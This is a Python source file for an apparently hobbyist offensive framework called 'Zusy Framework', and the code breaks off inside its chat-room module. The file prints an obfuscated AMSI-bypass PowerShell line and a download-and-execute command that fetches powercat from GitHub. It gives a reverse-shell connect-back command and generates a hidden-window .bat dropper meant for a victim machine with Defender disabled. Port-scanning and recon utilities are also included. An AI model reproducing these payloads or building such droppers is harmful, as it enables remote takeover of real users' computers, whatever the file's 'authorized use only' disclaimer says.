import subprocess
import shutil
import re
from colorama import Fore
import socket
import os
import time
import signal
import random
import urllib.request
import urllib.error
import json
import hashlib
import base64
import platform
import ipaddress
import struct
import threading
import sys

# ── Rich UI ──────────────────────────────────────────────────────────────────
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.text import Text
from rich.rule import Rule
from rich.progress import Progress, SpinnerColumn, TextColumn, TimeElapsedColumn, BarColumn
from rich.columns import Columns
from rich.align import Align
from rich import box
from rich.style import Style
from rich.padding import Padding
from rich.live import Live
from rich.layout import Layout

console = Console()

blod1 = '\033[1m'
blod2 = '\033[0m'

_listener_running = False

# ─────────────────────────────────────────────────────────────────────────────
# COLOUR / STYLE CONSTANTS
# ─────────────────────────────────────────────────────────────────────────────
C_OK      = "[bold bright_green]"
C_WARN    = "[bold yellow]"
C_ERR     = "[bold red]"
C_INFO    = "[bold cyan]"
C_DIM     = "[dim white]"
C_HEAD    = "[bold red]"
C_CMD     = "[bold cyan]"
C_SUCCESS = "[bold bright_green]"
C_WAIT    = "[bold magenta]"
C_END     = "[/]"

# ─────────────────────────────────────────────────────────────────────────────
# STATUS LINE PRINTERS
# ─────────────────────────────────────────────────────────────────────────────

def ok(msg: str) -> None:
    console.print(f"  {C_OK}[ SUCCESS ]{C_END}  {msg}")

def warn(msg: str) -> None:
    console.print(f"  {C_WARN}[ WARNING ]{C_END}  [yellow]{msg}[/]")

def err(msg: str) -> None:
    console.print(f"  {C_ERR}[  ERROR  ]{C_END}  [bold red]{msg}[/]")

def info(msg: str) -> None:
    console.print(f"  {C_INFO}[  INFO   ]{C_END}  {msg}")

def wait(msg: str) -> None:
    console.print(f"  {C_WAIT}[  WAIT   ]{C_END}  [magenta]{msg}[/]")

def ok_line(msg: str) -> None:
    console.print(f"  {C_OK}[   OK    ]{C_END}  {msg}")

def section(title: str) -> None:
    console.print()
    console.rule(
        f"  [bold red]◈[/]  [bold white]{title}[/]  [bold red]◈[/]",
        style="red",
        characters="─",
    )
    console.print()


# ─────────────────────────────────────────────────────────────────────────────
# CHECK / INSTALL POWERCAT
# ─────────────────────────────────────────────────────────────────────────────

def check_powercat():
    try:
        result = subprocess.run(['which', 'powercat'],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            pass
        else:
            install = subprocess.run(['sudo', 'apt', 'install', '-y', 'powercat'],
                                     stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if install.returncode == 0:
                pass
            else:
                err("")
    except Exception as e:
        err(f"")


# ─────────────────────────────────────────────────────────────────────────────
# ASCII BANNERS
# ─────────────────────────────────────────────────────────────────────────────

ascii_art_list = [
    r"""
       \            _    _            _    
        \          | |  | |          | |   
         \\         | |__| | __ _  ___| | __
          \\        |  __  |/ _` |/ __| |/ /
           >\/7    | |  | | (_| | (__|   < 
       _.-(6'  \   |_|  |_|\__,_|\___|_|\_\
      (=___._/` \         _   _          
           )  \ |        | | | |         
          /   / |        | |_| |__   ___ 
         /    > /        | __| '_ \ / _ \
        j    < _\        | |_| | | |  __/
     .-' :      ``.       \__|_| |_|\___|
     \ r=._\        `.
    <`\\_  \         .`-.           _____  _                  _   _ 
     \ r-7  `-. ._  ' .  `\       |  __ \| |                | | | |
      \`,      `-.`7  7)   )      | |__) | | __ _ _ __   ___| |_| |
       \/         \|  \'  / `-._  |  ___/| |/ _` | '_ \ / _ \ __| |
                  ||    .'        | |    | | (_| | | | |  __/ |_|_|
                   \\  (          |_|    |_|\__,_|_| |_|\___|\__(_)
                    >\  >
                 ,.-' >.'
               <.'_.''                                           v 1.0
    """,
    r"""
 ___________
||         ||            _______
||  Zusy   ||           | _____ |
||         ||           ||_____||
||_________||           |  ___  |
|__+_+_+_+__|           | |___| |
    _|_|_   \           |       |
   (_____)   \          |       |
              \    ___  |       |
       ______  \__/   \_|       |
      |   _  |      _/  |       |
      |  ( ) |     /    |_______|
      |___|__|    /
           \_____/
                                                                 v 1.0
    """,
]


def print_random_element():
    random_element = random.choice(ascii_art_list)
    console.print(Align.center(f"[bold red]{random_element}[/]"))


# ─────────────────────────────────────────────────────────────────────────────
# NETWORKING
# ─────────────────────────────────────────────────────────────────────────────

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
    finally:
        s.close()
    return local_ip


def get_public_ip():
    """Best-effort public/WAN IP via a couple of free echo services. None on failure."""
    for url in ("https://api.ipify.org", "https://ifconfig.me/ip", "https://icanhazip.com"):
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "curl/8"})
            with urllib.request.urlopen(req, timeout=5) as r:
                ip = r.read().decode().strip()
                if ip and re.match(r"^\d{1,3}(\.\d{1,3}){3}$", ip):
                    return ip
        except Exception:
            continue
    return None


local_ip = get_local_ip()


# ─────────────────────────────────────────────────────────────────────────────
# VICTIM-SIDE SHELL INSTRUCTIONS
# ─────────────────────────────────────────────────────────────────────────────

def print_shellcommand(lhost: str) -> None:
    cmd1 = (
        "[Ref].Assembly.GetType('Sy'+'stem.Manag'+'ement.Aut'+'omation.'+"
        "$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBt'+'AHMs'"
        "+'AaQBV'+'AHQA'+'aQBsA'+'HMA')))).GetField($([Text.Encoding]::Unicode.GetString"
        "([Convert]::FromBase64String('Y'+'QBtAHMA'+'aQ'+'BJAG4A'+'aQB0AEYAY'+'QBpAGwAZQ"
        "'+BkAA=='))),'NonPublic,Static').SetValue($null,$true)"
    )
    cmd2 = (
        "IEX (New-Object System.Net.Webclient)"
        ".DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')"
    )
    cmd3 = f"powercat -c {lhost} -p 8000 -e cmd"

    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]VICTIM-SIDE PAYLOAD DEPLOYMENT[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()

    warn_text = Text()
    warn_text.append("  ⚠  PREREQUISITE  ", style="bold black on yellow")
    warn_text.append(
        "  Windows Defender / Real-Time Protection MUST be disabled on the target.",
        style="bold yellow",
    )
    console.print(Padding(warn_text, (0, 2)))
    console.print()

    console.print("  [bold red on black] STEP 01 [/]  [bold white]AMSI Bypass[/]  [dim]─ Disable in-memory script scanning[/]")
    console.print()
    console.print(Panel(
        f"[bright_green]{cmd1}[/]",
        border_style="dim red", padding=(0, 2), expand=False,
    ))
    console.print()

    console.print("  [bold red on black] STEP 02 [/]  [bold white]Load PowerCat[/]  [dim]─ Fetch reverse-shell utility from GitHub[/]")
    console.print()
    console.print(Panel(
        f"[bright_green]{cmd2}[/]",
        border_style="dim red", padding=(0, 2), expand=False,
    ))
    console.print()

    console.print("  [bold red on black] STEP 03 [/]  [bold white]Connect Back[/]  [dim]─ Establish shell to your listener[/]")
    console.print()
    console.print(Panel(
        f"[bright_green]{cmd3}[/]",
        border_style="dim red", padding=(0, 2), expand=False,
    ))
    console.print()
    console.rule(style="dim red", characters="═")
    console.print()


# ─────────────────────────────────────────────────────────────────────────────
# BAT FILE GENERATOR MODULE
# ─────────────────────────────────────────────────────────────────────────────

def create_bat_dropper(lhost: str, lport: str) -> None:
    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]BAT DROPPER GENERATOR[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()

    info("This module generates a [bold white].bat[/] file for the victim machine.")
    info(f"Listener IP auto-detected: [bold cyan]{lhost}[/]  Port: [bold cyan]{lport}[/]")
    console.print()

    console.print("  [bold red]Output filename[/] [dim](no extension, e.g. update)[/] : ", end="")
    filename = input().strip()
    if not filename:
        filename = "payload"

    output_file = f"{filename}.bat"

    ps_cmd = (
        f"IEX (New-Object System.Net.Webclient)"
        f".DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')"
        f"; powercat -c {lhost} -p {lport} -e cmd"
    )

    bat_content = (
        "@echo off\r\n"
        ":: Zusy Framework - Reverse Shell Dropper\r\n"
        f"powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \"{ps_cmd}\"\r\n"
    )

    try:
        with open(output_file, "w", newline="") as f:
            f.write(bat_content)
    except Exception as e:
        err(f"Could not write file: {e}")
        console.print()
        return

    console.print()
    preview = Text()
    preview.append("@echo off\n", style="dim white")
    preview.append(":: Zusy Framework - Reverse Shell Dropper\n", style="dim green")
    preview.append("powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command \\\n", style="bright_green")
    preview.append(f'  "IEX (New-Object System.Net.Webclient)\n', style="bright_green")
    preview.append( f'    .DownloadString(\'...powercat.ps1\') ; powercat -c {lhost} -p {lport} -e cmd"\n', style="bright_green")

    console.print(Panel(
        preview,
        title=f"[bold red]  {output_file}  [/]",
        subtitle="[dim]Run on victim with Windows Security disabled[/]",
        border_style="red",
        padding=(0, 2),
    ))
    console.print()

    table = Table(
        box=box.HEAVY_HEAD, border_style="dim red",
        header_style="bold red on black", show_header=True,
        min_width=65, padding=(0, 2),
    )
    table.add_column("PARAMETER",  style="bold cyan",         width=18)
    table.add_column("VALUE",      style="bold bright_green", width=44)
    table.add_row("Output file",   f"{os.getcwd()}/{output_file}")
    table.add_row("Callback IP",   lhost)
    table.add_row("Callback port", lport)
    table.add_row("Shell",         "cmd.exe")
    table.add_row("Window",        "Hidden (no popup)")
    console.print(table)
    console.print()

    ok(f"Dropper written  →  [bold cyan]{os.getcwd()}/{output_file}[/]")
    console.print()

    console.print("  [bold white]Start listener now and wait for connection?[/]  [dim](y/N)[/] : ", end="")
    answer = input().strip().lower()
    if answer == "y":
        reverseshell(lhost, lport)
    else:
        info("Listener not started. Run [bold cyan]exploit[/] or [bold cyan]run[/] when ready.")
        console.print()


# ─────────────────────────────────────────────────────────────────────────────
# SIGNAL HANDLER
# ─────────────────────────────────────────────────────────────────────────────

def signal_handler(sig, frame):
    global _listener_running
    if _listener_running:
        console.print()
        warn("Listener interrupted — returning to menu …")
        console.print()
        _listener_running = False
        raise SystemExit(0)
    else:
        console.print()
        warn("Caught interrupt — type [bold cyan]exit[/] to quit cleanly, or press [bold white]Enter[/] to resume.")
        console.print()


# ─────────────────────────────────────────────────────────────────────────────
# STARTUP ANIMATION
# ─────────────────────────────────────────────────────────────────────────────

def loading_animation(string, duration=3):
    console.print()
    with Progress(
        SpinnerColumn(spinner_name="bouncingBall", style="bold red"),
        TextColumn(f"  [bold white]{string}[/]"),
        BarColumn(bar_width=38, style="red", complete_style="bright_green"),
        TextColumn("[dim white]{task.percentage:>3.0f}%[/]"),
        TimeElapsedColumn(),
        console=console,
        transient=True,
    ) as progress:
        task = progress.add_task("", total=100)
        step = 100 / (duration * 20)
        while not progress.finished:
            progress.advance(task, step)
            time.sleep(0.05)
    console.print()


# ─────────────────────────────────────────────────────────────────────────────
# MENU UI HELPERS
# ─────────────────────────────────────────────────────────────────────────────

def print_help(current_exploit: str) -> None:
    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]COMMAND REFERENCE[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()

    console.print("  [bold red]┌─[/] [bold white]FRAMEWORK NAVIGATION[/]")
    console.print()

    nav = Table(
        box=box.SIMPLE, show_header=False,
        padding=(0, 2), border_style="dim red", min_width=80,
    )
    nav.add_column("cmd",  style="bold cyan",  no_wrap=True, width=42)
    nav.add_column("desc", style="dim white",               width=38)

    nav.add_row("use exploit/windows/reverseshell",    "◂  Windows PowerShell reverse shell")
    nav.add_row("use exploit/meterpreter/reverse_tcp", "◂  Meterpreter payload via msfvenom")
    nav.add_row("use exploit/windows/batdropper",      "◂  Generate .bat dropper + start listener")
    nav.add_row("options",                             "◂  Current module parameters")
    nav.add_row("set LPORT <port>",                    "◂  Change listener port")
    nav.add_row("exit_module",                         "◂  Unload active module")
    nav.add_row("exploit",                             "◂  Execute selected module")
    nav.add_row("run",                                 "◂  Alias for [bold cyan]exploit[/]")
    console.print(nav)

    console.print()
    console.print("  [bold red]┌─[/] [bold white]CHAT ROOM[/]")
    console.print()

    chat_tbl = Table(
        box=box.SIMPLE, show_header=False,
        padding=(0, 2), border_style="dim red", min_width=80,
    )
    chat_tbl.add_column("cmd",  style="bold cyan",  no_wrap=True, width=42)
    chat_tbl.add_column("desc", style="dim white",               width=38)
    chat_tbl.add_row("chat create",           "◂  Open a chat room (public via ngrok)")
    chat_tbl.add_row("chat join <host:port>", "◂  Join a chat room")
    console.print(chat_tbl)

    console.print()
    console.print("  [bold red]┌─[/] [bold white]UTILITIES[/]")
    console.print()

    util = Table(
        box=box.SIMPLE, show_header=False,
        padding=(0, 2), border_style="dim red", min_width=80,
    )
    util.add_column("cmd",  style="bold cyan",  no_wrap=True, width=42)
    util.add_column("desc", style="dim white",               width=38)

    util.add_row("ifconfig",                "◂  Display active interface / IP")
    util.add_row("sysinfo",                 "◂  Local system information")
    util.add_row("netstat",                 "◂  Active network connections")
    util.add_row("uptime",                  "◂  System uptime")
    util.add_row("diskinfo",                "◂  Disk usage")
    util.add_row("set",                     "◂  Show all current settings")
    util.add_row("history",                 "◂  Session command history")
    util.add_row("ping <ip>",               "◂  ICMP ping check")
    util.add_row("traceroute <ip>",         "◂  Network path to target")
    util.add_row("portscan <ip>",           "◂  TCP port scanner (common ports)")
    util.add_row("portrange <ip> <s> <e>",  "◂  Scan custom port range")
    util.add_row("sweep <ip>",              "◂  Ping sweep /24 network")
    util.add_row("banner <ip> <port>",      "◂  Grab service banner")
    util.add_row("dnslookup <domain>",      "◂  DNS A / MX / NS lookup")
    util.add_row("subdomains <domain>",     "◂  Common subdomain probe")
    util.add_row("httpheaders <url>",       "◂  HTTP response headers")
    util.add_row("macvendor <mac>",         "◂  MAC address vendor lookup")
    util.add_row("arplist",                 "◂  Local ARP table")
    util.add_row("openports",               "◂  Locally listening ports")
    util.add_row("hashgen <text>",          "◂  MD5 / SHA1 / SHA256 / SHA512")
    util.add_row("base64 encode <text>",    "◂  Base64 encode a string")
    util.add_row("base64 decode <text>",    "◂  Base64 decode a string")
    util.add_row("hexencode <text>",        "◂  String to hex")
    util.add_row("hexdecode <hex>",         "◂  Hex to string")
    util.add_row("rot13 <text>",            "◂  ROT13 encode / decode")
    util.add_row("urlencode <text>",        "◂  URL encode a string")
    util.add_row("help_reverseshell",       "◂  Print victim-side PowerShell steps")
    util.add_row("info",                    "◂  Framework credits & links")
    util.add_row("clear",                   "◂  Clear terminal screen")
    util.add_row("exit",                    "◂  Terminate session")
    console.print(util)

    if current_exploit:
        console.print()
        console.print(
            f"  [dim red]Active module →[/]  [bold cyan]{current_exploit}[/]\n"
        )

    console.rule(style="dim red", characters="─")
    console.print()


def print_options(lhost: str, lport: str) -> None:
    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]MODULE OPTIONS[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()

    table = Table(
        box=box.HEAVY_HEAD, border_style="dim red",
        header_style="bold red on black", show_header=True,
        min_width=80, padding=(0, 2),
    )
    table.add_column("PARAMETER",   style="bold cyan",         width=14, no_wrap=True)
    table.add_column("VALUE",       style="bold bright_green", width=22)
    table.add_column("REQUIRED",    style="yellow",            width=10)
    table.add_column("DESCRIPTION", style="dim white",         width=30)

    table.add_row("LHOST", lhost, "[bold green]YES[/]", "Local listener IP address")
    table.add_row("LPORT", lport, "[bold green]YES[/]", "Local listener port")

    console.print(table)
    console.print()
    console.rule(style="dim red", characters="─")
    console.print()


def print_info() -> None:
    console.print()
    console.rule(
        "  [bold red]◈[/]  [bold white]FRAMEWORK INFORMATION[/]  [bold red]◈[/]",
        style="red", characters="═",
    )
    console.print()

    body = Text()
    body.append("\n")
    body.append("  ◆  AUTHOR       ", style="bold red")
    body.append("No_Name.exe (Zusy)\n\n", style="bold white")
    body.append("  ◆  PURPOSE      ", style="bold red")
    body.append(
        "Security research & penetration testing in controlled lab environments.\n\n",
        style="dim white",
    )
    body.append("  ◆  DISCLAIMER   ", style="bold red")
    body.append(
        "The authors accept no responsibility for malicious or unauthorized use.\n\n",
        style="dim white",
    )
    body.append("  ─" * 36 + "\n\n", style="dim red")
    body.append("  ◆  GITHUB       ", style="bold red")
    body.append("https://github.com/NoNameZusy/\n\n", style="bold cyan underline")
    body.append("  ◆  YOUTUBE      ", style="bold red")
    body.append(
        "https://www.youtube.com/channel/UCql2YVKt-wF1LFuxhAthcaQ\n",
        style="bold cyan underline",
    )

    console.print(Panel(
        body,
        title="[bold red]  ZUSY FRAMEWORK  [/]",
        subtitle="[dim]v 1.0  ─  AUTHORIZED USE ONLY[/]",
        border_style="red",
        padding=(0, 1),
    ))
    console.print()
    console.rule(style="dim red", characters="─")
    console.print()


def print_exploit_selected(name: str) -> None:
    console.print()
    console.print(
        f"  {C_OK}[ SUCCESS ]{C_END}  Module loaded  [dim red]→[/]  [bold cyan]{name}[/]"
        f"  [dim](run [bold cyan]options[/] to configure)[/]"
    )
    console.print()


# ─────────────────────────────────────────────────────────────────────────────
# ███████╗███████╗ ██████╗  ██████╗██╗███████╗████████╗██╗   ██╗
# ██╔════╝██╔════╝██╔═══██╗██╔════╝██║██╔════╝╚══██╔══╝╚██╗ ██╔╝
# ███████╗█████╗  ██║   ██║██║     ██║█████╗     ██║    ╚████╔╝ 
# ╚════██║██╔══╝  ██║   ██║██║     ██║██╔══╝     ██║     ╚██╔╝  
# ███████║███████╗╚██████╔╝╚██████╗██║███████╗   ██║      ██║   
# ╚══════╝╚══════╝ ╚═════╝  ╚═════╝╚═╝╚══════╝   ╚═╝      ╚═╝  
#   CHAT ROOM MODULE  —  TCP based, ngrok powered, multi-user
# ─────────────────────────────────────────────────────────────────────────────

CHAT_PORT = 9999                 # Default listening port

# Per-user ANSI foreground colors (sent over the wire so every terminal sees them)
CHAT_ANSI_COLORS = [
    "92",  # bright green
    "96",  # bright cyan
    "93",  # bright yellow
    "95",  # bright magenta
    "94",  # bright blue
    "97",  # bright white
    "33",  # orange/amber
    "91",  # bright red
]
_HOST_COLOR   = "91"             # host is always bright red
_CLIENT_ECHO  = "96"             # color for your own echoed messages (client side)

# ── Shared state (server side) ───────────────────────────────────────────────
_chat_clients      = {}          # {conn: {"username","color","addr","leave_reason"}}
_chat_clients_lock = threading.Lock()
_chat_active       = False       # Server loop flag

_chat_host_username = "HOST"     # the admin's username (server creator = red)
_chat_room_name     = "ZUSY"     # the chat/group name (used in ban/kick notices)
_chat_bans          = set()      # set of banned IP strings
_chat_seen          = {}         # username(lower) -> last known IP (for /ban by name)
_chat_server_sock   = None       # reference so /shutdown can force-close everything
_chat_bore_proc     = None       # bore tunnel subprocess (if used) for cleanup

# Control prefix: a line starting with this byte is a protocol command, never a
# chat message. The line editor never lets a user type control chars (< 32),
# so real messages can never collide with it.
_CHAT_CTRL = "\x01"

# Active local line-editor terminal (set during a chat session, else None)
_chat_term = None


# ─────────────────────────────────────────────────────────────────────────────
#   MESSAGE FORMATTING  (ANSI — rendered identically on every terminal)
# ─────────────────────────────────────────────────────────────────────────────

def _fmt_msg(username: str, color_code: str, text: str) -> str:
    """A normal chat line:  12:30 │ alice   hello there"""
    ts = time.strftime("%H:%M")
    return (
        f"\033[2;37m{ts}\033[0m "
        f"\033[90m│\033[0m "
        f"\033[1;{color_code}m{username:<12}\033[0m "
        f"\033[0m{text}\033[0m"
    )


def _fmt_sys(text: str, kind: str = "info") -> str:
    """System notices: join / leave / info — dim, centered feel with arrows."""
    if kind == "join":
        return f"\033[2;92m   →  {text}\033[0m"
    if kind == "leave":
        return f"\033[2;91m   ←  {text}\033[0m"
    return f"\033[2;90m   ·  {text}\033[0m"


# ─────────────────────────────────────────────────────────────────────────────
#   TERMINAL LINE EDITOR
#   Lets you type a message while incoming messages keep arriving, WITHOUT the
#   input line getting corrupted. Incoming text is printed above a freshly
#   redrawn prompt that preserves whatever you have typed so far.
# ─────────────────────────────────────────────────────────────────────────────

try:
    import termios as _termios
    import tty as _tty
    import select as _select
    import codecs as _codecs
    _HAS_TTY = sys.stdin.isatty()
except Exception:
    _HAS_TTY = False


class _ChatTerminal:
    """Raw (cbreak) line editor that coexists with async output."""

    def __init__(self, prompt: str, should_stop=None):
        self.prompt      = prompt          # ANSI prompt string
        self.buf         = ""              # current typed line
        self.lock        = threading.Lock()
        self.should_stop = should_stop or (lambda: False)
        self._fd         = sys.stdin.fileno()
        self._old        = _termios.tcgetattr(self._fd)
        self._decoder    = _codecs.getincrementaldecoder("utf-8")(errors="replace")

    # -- lifecycle ------------------------------------------------------------
    def start(self):
        _tty.setcbreak(self._fd)           # char-by-char, keeps Ctrl+C (ISIG)
        self._redraw()

    def stop(self):
        try:
            _termios.tcsetattr(self._fd, _termios.TCSADRAIN, self._old)
        except Exception:
            pass

    # -- drawing --------------------------------------------------------------
    def _redraw(self):
        sys.stdout.write("\r\033[K" + self.prompt + self.buf)
        sys.stdout.flush()

    def print_message(self, text: str):
        """Called from the receiver thread to print an incoming line cleanly."""
        with self.lock:
            sys.stdout.write("\r\033[K")    # wipe the current input line
            sys.stdout.write(text + "\n")   # print the incoming message
            self._redraw()                  # restore prompt + whatever you typed

    def clear_screen(self):
        """Wipe the whole screen (local only) and redraw the prompt."""
        with self.lock:
            sys.stdout.write("\033[2J\033[H")
            self._redraw()

    # -- input ----------------------------------------------------------------
    def read_line(self):
        """
        Block until Enter. Returns the typed string, or None if the session
        should stop (peer disconnect / EOF). Ctrl+C raises KeyboardInterrupt.
        """
        while True:
            if self.should_stop():
                return None
            r, _, _ = _select.select([self._fd], [], [], 0.2)
            if not r:
                continue
            chunk = os.read(self._fd, 1024)
            if not chunk:                   # EOF
                return None
            for ch in self._decoder.decode(chunk):
                o = ord(ch)
                if ch in ("\r", "\n"):
                    with self.lock:
                        line = self.buf
                        self.buf = ""
                        self._redraw()
                    return line
                if o in (127, 8):           # Backspace / DEL
                    with self.lock:
                        if self.buf:
                            self.buf = self.buf[:-1]
                            self._redraw()
                elif o == 27:               # escape seq (arrows) → swallow
                    # consume a possible "[X" sequence if it's already buffered
                    try:
                        extra = os.read(self._fd, 2)
                        self._decoder.decode(extra)
                    except Exception:
                        pass
                elif o == 3:                # Ctrl+C (in case ISIG is off)
                    raise KeyboardInterrupt
                elif o == 4:                # Ctrl+D
                    return None
                elif o >= 32:               # printable
                    with self.lock:
                        self.buf += ch
                        sys.stdout.write(ch)
                        sys.stdout.flush()


class _ChatTerminalFallback:
    """No-tty / Windows fallback: plain input() with locked output."""

    def __init__(self, prompt: str, should_stop=None):
        self.prompt = re.sub(r"\033\[[0-9;]*m", "", prompt)  # strip ANSI for plain prompt
        self.lock   = threading.Lock()

    def start(self):
        pass

    def stop(self):
        pass

    def print_message(self, text: str):
        with self.lock:
            sys.stdout.write("\r\033[K" + text + "\n")
            sys.stdout.flush()

    def clear_screen(self):
        with self.lock:
            sys.stdout.write("\033[2J\033[H")
            sys.stdout.flush()

    def read_line(self):
        try:
            with self.lock:
                sys.stdout.write(self.prompt)
                sys.stdout.flush()
            return input()
        except EOFError:
            return None


def _make_terminal(prompt: str, should_stop=None):
    if _HAS_TTY:
        try:
            return _ChatTerminal(prompt, should_stop)
        except Exception:
            pass
    return _ChatTerminalFallback(prompt, should_stop)


def _chat_local_print(line: str) -> None:
    """Print a line to the host/client screen via the active terminal if any."""
    t = _chat_term
    if t is not None:
        t.print_message(line)
    else:
        sys.stdout.write(line + "\n")
        sys.stdout.flush()


# ─────────────────────────────────────────────────────────────────────────────
#   IN-CHAT COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

def _is_command(text: str) -> bool:
    """A line is a command ONLY if it starts (after trimming) with '/' or is '?'.
    'hello /clear' is a normal message; '/clear' is a command."""
    s = text.strip()
    return s == "?" or s.startswith("/")


def _unique_username(name: str) -> str:
    """Ensure a single occurrence of each name. 'Zusy' taken -> 'Zusy2' -> ..."""
    name = name.strip() or "Guest"
    taken = {_chat_host_username.lower()}
    with _chat_clients_lock:
        for info in _chat_clients.values():
            taken.add(info["username"].lower())
    if name.lower() not in taken:
        return name
    n = 2
    while f"{name}{n}".lower() in taken:
        n += 1
    return f"{name}{n}"


def _chat_help_text(is_admin: bool) -> str:
    """Multi-line ANSI help block (printed locally only)."""
    L = []
    L.append("\033[1;91m  ── CHAT COMMANDS ──\033[0m")
    L.append("\033[96m  /help\033[0m \033[90mor\033[0m \033[96m?\033[0m   \033[2mshow this help\033[0m")
    L.append("\033[96m  /clear\033[0m       \033[2mclear your own screen\033[0m")
    L.append("\033[96m  /userlist\033[0m    \033[2mlist active users\033[0m")
    if is_admin:
        L.append("\033[1;91m  ── ADMIN COMMANDS ──\033[0m")
        L.append("\033[91m  /kick <user>\033[0m  \033[2mdisconnect a user\033[0m")
        L.append("\033[91m  /ban <user>\033[0m   \033[2mdisconnect + ban their IP\033[0m")
        L.append("\033[91m  /unban <ip>\033[0m   \033[2mremove a ban\033[0m")
        L.append("\033[91m  /banlist\033[0m      \033[2mshow banned IPs\033[0m")
        L.append("\033[91m  /shutdown\033[0m     \033[2mkick everyone and close the room\033[0m")
    L.append("\033[2;90m  (commands run only for you and are never sent to others)\033[0m")
    return "\n".join(L)


def _chat_userlist_text() -> str:
    """Build the active-user list from server state (host calls this directly;
    clients receive it from the server)."""
    rows = []
    rows.append("\033[1;96m  ── ACTIVE USERS ──\033[0m")
    rows.append(f"\033[1;91m  • {_chat_host_username}\033[0m \033[2;90m(host, admin)\033[0m")
    with _chat_clients_lock:
        items = [(i["username"], i["color"], i["addr"][0]) for i in _chat_clients.values()]
    for uname, color, ip in items:
        rows.append(f"\033[1;{color}m  • {uname}\033[0m \033[2;90m({ip})\033[0m")
    total = len(items) + 1
    rows.append(f"\033[2;90m  {total} user(s) online\033[0m")
    return "\n".join(rows)


def _chat_find_conn(name: str):
    """Return (conn, info) for a connected user by name (case-insensitive)."""
    name = name.lower()
    with _chat_clients_lock:
        for conn, info in _chat_clients.items():
            if info["username"].lower() == name:
                return conn, info
    return None, None


def _chat_kick(name: str, ban: bool = False) -> str:
    """Admin: kick (and optionally ban) a user. Returns a status line for admin."""
    if name.lower() == _chat_host_username.lower():
        return "\033[91m  You cannot kick yourself.\033[0m"
    conn, info = _chat_find_conn(name)
    if not conn:
        return f"\033[91m  No connected user named '{name}'.\033[0m"
    ip = info["addr"][0]
    uname = info["username"]
    if ban:
        _chat_bans.add(ip)
    # mark the reason so the handler thread announces it correctly
    info["leave_reason"] = "ban" if ban else "kick"
    try:
        verb = "banned" if ban else "kicked"
        conn.sendall(
            f"\r\n\033[1;91m  You have been {verb} from {_chat_room_name} by the admins.\033[0m\r\n".encode()
        )
    except Exception:
        pass
    try:
        conn.shutdown(socket.SHUT_RDWR)
    except Exception:
        pass
    try:
        conn.close()
    except Exception:
        pass
    if ban:
        return f"\033[1;91m  {uname} ({ip}) banned.\033[0m"
    return f"\033[1;91m  {uname} kicked.\033[0m"


def _chat_unban(target: str) -> str:
    """Admin: remove a ban by IP, or by a previously-seen username."""
    target = target.strip()
    is_ip = bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", target))
    if is_ip:
        ip = target
    else:
        ip = _chat_seen.get(target.lower())
        if not ip:
            return f"\033[91m  Unknown user/IP '{target}'.\033[0m"
    if ip in _chat_bans:
        _chat_bans.discard(ip)
        return f"\033[1;92m  {ip} unbanned.\033[0m"
    return f"\033[91m  {ip} is not banned.\033[0m"


def _chat_banlist_text() -> str:
    if not _chat_bans:
        return "\033[2;90m  No banned IPs.\033[0m"
    rows = ["\033[1;91m  ── BANNED IPs ──\033[0m"]
    for ip in sorted(_chat_bans):
        rows.append(f"\033[91m  • {ip}\033[0m")
    return "\n".join(rows)


# ── Helper: broadcast to every connected client ──────────────────────────────

def _chat_broadcast(message: str, exclude_conn=None) -> None:
    """Send a raw string message (newline included) to all connected clients."""
    encoded = (message + "\n").encode("utf-8", errors="replace")
    dead    = []
    with _chat_clients_lock:
        for conn in list(_chat_clients.keys()):
            if conn is exclude_conn:
                continue
            try:
                conn.sendall(encoded)
            except Exception:
                dead.append(conn)
        for conn in dead:
            _chat_clients.pop(conn, None)


# ── Server: one thread per client ────────────────────────────────────────────

def _chat_handle_client(conn: socket.socket, addr: tuple) -> None:
    """Runs in its own thread for every connected client."""
    global _chat_active

    # 0) Ban check — send a detectable marker so the client never asks for a name
    if addr[0] in _chat_bans:
        try:
            conn.sendall(
                (_CHAT_CTRL + f"BAN You have been banned from {_chat_room_name} by the admins.\n").encode()
            )
            time.sleep(0.2)
            conn.close()
        except Exception:
            pass
        return

    # 1) Ask for a username
    try:
        conn.sendall(b"\r\n[ZUSY CHAT] Enter your username: ")
        username_raw = b""
        while True:
            ch = conn.recv(1)
            if not ch or ch in (b"\n", b"\r"):
                break
            username_raw += ch
        requested = username_raw.decode("utf-8", errors="replace").strip()
        if not requested:
            requested = f"Guest_{addr[1]}"
    except Exception:
        conn.close()
        return

    # Enforce one-name-only: 'Zusy' taken -> 'Zusy2' -> 'Zusy3' ...
    username = _unique_username(requested)

    # 2) Register (color + remember IP for later /ban-by-name & /unban)
    with _chat_clients_lock:
        color = CHAT_ANSI_COLORS[len(_chat_clients) % len(CHAT_ANSI_COLORS)]
        _chat_clients[conn] = {
            "username": username, "color": color,
            "addr": addr, "leave_reason": None,
        }
    _chat_seen[username.lower()] = addr[0]

    # 3) Welcome (+ note if their name was changed) + join announcement
    try:
        renamed = ""
        if username.lower() != requested.lower():
            renamed = f"\033[2m  (the name '{requested}' was taken, you are '{username}')\033[0m"
        conn.sendall(
            (f"\r\n\033[1;92m  ✔  Welcome to {_chat_room_name}, {username}!\033[0m  "
             f"\033[2mType /help or ? for commands. Ctrl+C to leave.\033[0m{renamed}\r\n\r\n").encode()
        )
